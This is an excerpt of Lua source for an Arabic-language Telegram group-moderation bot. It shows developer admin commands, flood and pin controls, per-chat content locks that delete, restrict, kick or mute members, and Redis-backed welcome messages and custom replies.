if text ==('المجموعات 📇') and is_devtaha(msg) then    local list = MARX:smembers(DEVSTOR..'bot:gpsby:id')   if #list == 0 then  DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,'*💥¦ لا توجد مجموعات حاليا *\n', 1, 'md')  return false  end local t = '⚡¦* اهلا بك في ايدي المجموعات 🍁*\n*ٴ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃*\n'    for k,v in pairs(list) do     local nummsg = tonumber(MARX:get(DEVSTOR..'groupmsg:'..v..':'))   numrgroup(v) local numg = (MARX:get(DEVSTOR.."numgrop"..v) or '3')  local namechat = MARX:get(DEVSTOR..'group:name'..v)   if namechat then  t = t..'*'..k.."➛* `"..v.."` "..tfgroup(nummsg).."\n*« "..namechat..' » ❪'..numg..'❫*\n*ٴ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃*\n'     else  t = t..'*'..k.."➛* `"..v.."` "..tfgroup(nummsg).."\n* ❪"..numg..'❫*\n*ٴ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃*\n'     end  file = io.open("DEVIL_groups", "w") file:write([[ ]]..isnothtml(t)..[[ ]]) file:close()   end    t = t..'*📮¦*لعرض معلومات مجموعه معينه\n*💥¦ ارسل كشف من ثم ايدي المجموعه*\n*🚸¦ مثال ❪كشف -10012345667❫*\n꞉'    if #list >= 25 then    local groups = MARX:scard(DEVSTOR..'bot:gpsby:id')    sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './DEVIL_groups','📛¦ عذرا لديك الكثير من المجموعات\n📬¦ تم ارسال المجموعات في الملف\n🚸¦ عدد المجموعات •⊱'..groups..'⊰•',dl_cb, nil)   else   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')    end   end
...
if text == 'مسح المشتركين 💯' and is_devtaha(msg) then     local list = MARX:smembers(DEVSTOR..'usersbot')     local pv = 0  for k,v in pairs(list) do      MARX:srem(DEVSTOR..'usersbot',v)    pv = pv + 1  end     DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*🎲¦ تم مسح » ❪'..pv..'❫ من المشتركين *\n', 1, 'md')   end  
if text == 'مسح المجموعات 💯' and is_devtaha(msg) then   local lgp = MARX:smembers(DEVSTOR.."bot:gpsby:id")   local lsug = MARX:smembers(DEVSTOR.."botgps")   local lgpn = MARX:scard(DEVSTOR.."bot:gpsby:id")   local lsugn = MARX:scard(DEVSTOR.."botgps") + MARX:scard(DEVSTOR.."bot:gpsby:id")   for k,v in pairs(lgp) do   rem_group(v)     changeChatMemberStatus(v, bot_id, "Left")    end   for k,v in pairs(lsug) do    rem_group(v)     changeChatMemberStatus(v, bot_id, "Left")    end   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,"*📮¦* تم مغادره البوت من » ❪"..lsugn.."❫ مجموعات \n✓", 1, 'md')   end
if text == 'المحظورين عام 📑' and is_devtaha(msg) then   local list = MARX:smembers(DEVSTOR..'DEVIL:gbaned')  local t = '*📮¦ قائمه المحظورين عام *\n*ٴ━━━━━━━━━*\n'   for k, v in pairs(list) do   local taha = MARX:get(DEVSTOR.."user:Name" .. v)  if taha then  local username = taha  t = t..'*'..k.." ➺* ❲["..username.."](tg://user?id="..v..")❳\n"     else  t = t..'*'..k.." ➺* ❲["..v.."](tg://user?id="..v..")❳\n"     end  end   if #list == 0 then   t = '*📬¦* لا يوجد محظورين عام في البوت'   end   DEVIL_sendMssg(msg.chat_id_,t,msg.id_,'md')  end  
if text == 'المطورين 📑' and is_devtaha(msg) then   local list = MARX:smembers(DEVSTOR..'sudo:bot')  local t = '*📮¦ قائمه مطورين البوت *\n*ٴ━━━━━━━━━*\n'   for k, v in pairs(list) do   local taha = MARX:get(DEVSTOR.."user:Name" .. v)  if taha then  local username = taha  t = t..'*'..k.." ➺* ❲["..username.."](tg://user?id="..v..")❳\n"     else  t = t..'*'..k.." ➺* ❲["..v.."](tg://user?id="..v..")❳\n"     end  end   if #list == 0 then   t = '*📬¦* لا يوجد مطورين في البوت'   end   DEVIL_sendMssg(msg.chat_id_,t,msg.id_,'md')  end  
if text == 'المميزين عام 📑' and is_devtaha(msg) then   local list = MARX:smembers(DEVSTOR..'vip:groups')  local t = '*📮¦ قائمه المميزين عام *\n*ٴ━━━━━━━━━*\n'   for k, v in pairs(list) do   local taha = MARX:get(DEVSTOR.."user:Name" .. v)  if taha then  local username = taha  t = t..'*'..k.." ➺* ❲["..username.."](tg://user?id="..v..")❳\n"     else  t = t..'*'..k.." ➺* ❲["..v.."](tg://user?id="..v..")❳\n"     end  end   if #list == 0 then   t = '*📬¦* لا يوجد مميزين عام في البوت'   end   DEVIL_sendMssg(msg.chat_id_,t,msg.id_,'md')  end  
if text and text:match("^استخراج الرابط 🔦$") and is_devtaha(msg) then   MARX:setex(DEVSTOR.."get:link:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)   local t = '*📮¦ حسنآ ارسل لي ايدي المجموعه*\n💥'   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')  end
if text and text:match("^كشف 🔍$") and is_devtaha(msg) then   MARX:setex(DEVSTOR.."get:info:gp" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  local t = '*📮¦ حسنآ ارسل لي ايدي المجموعه*\n💥'   DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md')  end
end
if chat_type == 'super' then 
if not MARX:sismember(DEVSTOR..'bot:gpsby:id',msg.chat_id_) then
...
floods = MARX:hget("flooding:settings:"..msg.chat_id_,"flood") or  'nil'
NUM_MSG_MAX = MARX:hget("flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = MARX:hget("flooding:settings:"..msg.chat_id_,"floodtime") or 5
if MARX:hget("flooding:settings:"..msg.chat_id_,"flood") then 
if not is_vipgroup(msg) then
if msg.content_.ID == "MessageChatAddMembers" then 
return else
local post_count = tonumber(MARX:get(DEVSTOR..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(MARX:hget("flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = MARX:hget("flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
MARX:setex(DEVSTOR..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(MARX:hget("flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
end 
end
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if MARX:hget("flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = MARX:hget("flooding:settings:"..msg.chat_id_,"floodmax") 
end
if MARX:hget("flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = MARX:hget("flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end	  
if tonumber(MARX:get('numlockpinmsg'..msg.chat_id_..msg.sender_user_id_) or 1) >= 100  then
MARX:del(DEVSTOR.."lockpin"..msg.chat_id_) 
else
if msg.content_.ID == 'MessagePinMessage' then    
if is_owner(msg) and MARX:get(DEVSTOR.."lockpin"..msg.chat_id_) then    
MARX:set(DEVSTOR..'pinned'..msg.chat_id_, msg.content_.message_id_) 
elseif not MARX:get(DEVSTOR.."lockpin"..msg.chat_id_) then    
MARX:set(DEVSTOR..'pinned'..msg.chat_id_, msg.content_.message_id_)    
end    
end
end
...
if MARX:get(DEVSTOR.."lockpin"..msg.chat_id_) then 
if msg.content_.ID == 'MessagePinMessage' then  
unpinChannelMessage(msg.chat_id_)  
local PinnedMessage = MARX:get(DEVSTOR..'pinned'..msg.chat_id_)  
...
if MARX:get(DEVSTOR..'lock:text'..msg.chat_id_) then       
delete_msg(msg.chat_id_,{[0] = msg.id_})   
return false end    
end     
---الاشعارات
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if MARX:get(DEVSTOR..'lock:tagservr'..msg.chat_id_) then  
delete_msg(msg.chat_id_,{[0] = msg.id_})       
end    
end   
---الاضافات والدخول
if msg.content_.ID == "MessageChatAddMembers" and not is_vipgroup(msg) then   
if MARX:get(DEVSTOR.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
...
if MARX:get(DEVSTOR.."lock:Join"..msg.chat_id_) == 'kick' then
...
if MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "del" and not is_vipgroup(msg) then    
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "ked" and not is_vipgroup(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "kick" and not is_vipgroup(msg) then    
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:user:name"..msg.chat_id_) == "ktm" and not is_vipgroup(msg) then    
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "del" and not is_vipgroup(msg) then    
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "ked" and not is_vipgroup(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "kick" and not is_vipgroup(msg) then    
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:hashtak"..msg.chat_id_) == "ktm" and not is_vipgroup(msg) then    
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "del" and not is_vipgroup(msg) then    
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "ked" and not is_vipgroup(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "kick" and not is_vipgroup(msg) then    
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Cmd"..msg.chat_id_) == "ktm" and not is_vipgroup(msg) then    
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "del" and not is_vipgroup(msg) then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "ked" and not is_vipgroup(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "kick" and not is_vipgroup(msg) then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Link"..msg.chat_id_) == "ktm" and not is_vipgroup(msg) then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Photo"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Photo"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Photo"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Video"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Video"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Video"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Animation"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Animation"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Animation"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:geam"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:geam"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:geam"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Audio"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Audio"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Audio"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:vico"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:vico"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:vico"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Keyboard"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Keyboard"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Keyboard"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Sticker"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Sticker"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Sticker"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:forward"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif MARX:get(DEVSTOR.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif MARX:get(DEVSTOR.."lock:forward"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif MARX:get(DEVSTOR.."lock:forward"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
return false
end
...
if MARX:get(DEVSTOR.."lock:Document"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Document"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Document"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if MARX:get(DEVSTOR.."lock:Unsupported"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Unsupported"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Unsupported"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
if not is_vipgroup(msg) then
if MARX:get(DEVSTOR.."lock:Markdaun"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Markdaun"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Markdaun"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end  
...
if MARX:get(DEVSTOR.."lock:Contact"..msg.chat_id_) == "del" then
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Contact"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Contact"..msg.chat_id_) == "kick" then
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Contact"..msg.chat_id_) == "ktm" then
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
sens = 400  
if MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "del" and utf8.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "ked" and utf8.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
ked(msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "kick" and utf8.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
kicck(msg,msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
elseif MARX:get(DEVSTOR.."lock:Spam"..msg.chat_id_) == "ktm" and utf8.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
MARX:sadd(DEVSTOR..'mutes'..msg.chat_id_,msg.sender_user_id_)
delete_msg(msg.chat_id_,{[0] = msg.id_}) 
end
end
...
local status_welcome = (MARX:get(DEVSTOR..'add:welc:'..msg.chat_id_) or 'rem')  
if status_welcome == 'add' and not MARX:get(DEVSTOR..'lock:tagservr'..msg.chat_id_)  then
if msg.content_.ID == "MessageChatJoinByLink" then
if not is_banned(msg.chat_id_,msg.sender_user_id_) then 
function wlc(extra,result,success) 
if MARX:get(DEVSTOR..'welcome:'..msg.chat_id_) then 
t = MARX:get(DEVSTOR..'welcome:'..msg.chat_id_) 
else  
t = '\n• نورت حبي \n•  name \n• ngp' 
end 
t = t:gsub('name','<DEVIL>'..CatchName(result.first_name_,25)..'</DEVIL>') 
t = t:gsub('ngp',MARX:get(DEVSTOR..'group:name'..msg.chat_id_)) 
...
MARX:set(DEVSTOR.."lock:text"..msg.chat_id_,true) 
...
MARX:setex(DEVSTOR.."set:description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local t = '*📋¦* ارسل النص الذي تريده '  
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t, 1, 'md') 
end
if text and text:match("^ضع ترحيب$") and is_mod(msg) then  
MARX:setex(DEVSTOR.."welc:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local t = '*📃¦* ارسل النص الذي تريده '  
local tt = '\n*📬¦* ايضا يمكنك وضع \n*📛¦* دالة طباعه الاسم `name` \n*📛¦* ودالة طباعه اسم المجموعه `ngp`'
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1,t..tt, 1, 'md') 
end
if text and text:match("^جلب صوره$") and not MARX:get(DEVSTOR.."lock:get:photo"..msg.chat_id_) then  
MARX:setex(DEVSTOR.."photo:bot" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
...
MARX:set("addreply1:"..msg.sender_user_id_..bot_id,"rep")   
return false   end     
if text then    
local rep = MARX:get("addreply1:"..msg.sender_user_id_..bot_id)   
if rep == 'rep' then    
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del("addreply1:"..msg.sender_user_id_..bot_id)   
return false  end 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📷¦ ارسل لي صورة الترحيب *\n", 1, 'md')   
MARX:set("addreply1:"..msg.sender_user_id_..bot_id,"repp")   
MARX:set("addreply2:"..msg.sender_user_id_..bot_id, text)   
MARX:set("klish:welc"..bot_id,text)   
return false   
end   
end   
if msg.content_.photo_ then   
local test = MARX:get("addreply1:"..msg.sender_user_id_..bot_id)   
if test == 'repp' then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم تغير كليشه الترحيب 💯*\n", 1, 'md')   
MARX:del("addreply1:"..msg.sender_user_id_..bot_id)   
local test = MARX:get("addreply2:"..msg.sender_user_id_..bot_id)   
if msg.content_.photo_ then   
if msg.content_.photo_.sizes_[1] then   
MARX:set("addreply1photo1"..bot_id, msg.content_.photo_.sizes_[1].photo_.persistent_id_)   
end 
end   
MARX:del("addreply2:"..msg.sender_user_id_..bot_id)   
return false   end   
end
...
local list = MARX:smembers(DEVSTOR.."rep:media"..msg.chat_id_)  
local taha = MARX:scard(DEVSTOR.."rep:media"..msg.chat_id_)  
for k,v in pairs(list) do  
MARX:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:gif"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:vico"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:stekr"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."taha:"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:photo"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:video"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:document"..v..msg.chat_id_)  
MARX:del(DEVSTOR.."addreply1:audio"..v..msg.chat_id_)  
MARX:srem(DEVSTOR.."rep:media"..msg.chat_id_,v)  
end  
...
for k,v in pairs(list) do  
if MARX:get(DEVSTOR.."addreply1:gif"..v..msg.chat_id_) then
taha = 'متحركه 🎆'
elseif MARX:get(DEVSTOR.."addreply1:vico"..v..msg.chat_id_)  then
taha = 'بصمه 🎵'
elseif MARX:get(DEVSTOR.."addreply1:stekr"..v..msg.chat_id_)  then
taha = 'ملصق 🃏'
elseif MARX:get(DEVSTOR.."taha:"..v..msg.chat_id_) then
taha = 'رساله 💭'
elseif MARX:get(DEVSTOR.."addreply1:photo"..v..msg.chat_id_)  then
taha = 'صوره 🌇'
elseif MARX:get(DEVSTOR.."addreply1:video"..v..msg.chat_id_)  then
taha = 'فيديو 📹'
elseif MARX:get(DEVSTOR.."addreply1:document"..v..msg.chat_id_)  then
taha = 'ملف 📁'
elseif MARX:get(DEVSTOR.."addreply1:audio"..v..msg.chat_id_)  then
taha = 'اغنيه 🎵'
end
t = t..'*'..k..'• *❨`'..v..'`❩ *» {'..taha..'}*\n'    
end  
...
MARX:set(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  end    
if text then   
local tsssst = MARX:get(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == 'rep' then   
if text and text:match("^الغاء$") then 
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, "*📬¦ تم الغاء الامر *\n✓", 1, "md") 
MARX:del(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_)  
return false  end 
if MARX:sismember(DEVSTOR..'rep:media'..msg.chat_id_,text) then
...
MARX:set(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_,"repp")  
MARX:set(DEVSTOR.."addreply2:"..msg.sender_user_id_..msg.chat_id_, text)  
MARX:sadd(DEVSTOR.."rep:media"..msg.chat_id_,text)  
end
return false  end  
end  
if text and text == 'حذف رد بالرد' and  is_monsh(msg) then   
DEVIL_sendMsg(msg.chat_id_, msg.id_, 1, '*📬¦ حسنآ ارسل لي الكلمه الان *\n💥', 1, 'md')  
MARX:set(DEVSTOR.."addreply1:"..msg.sender_user_id_..msg.chat_id_,"reppp")  
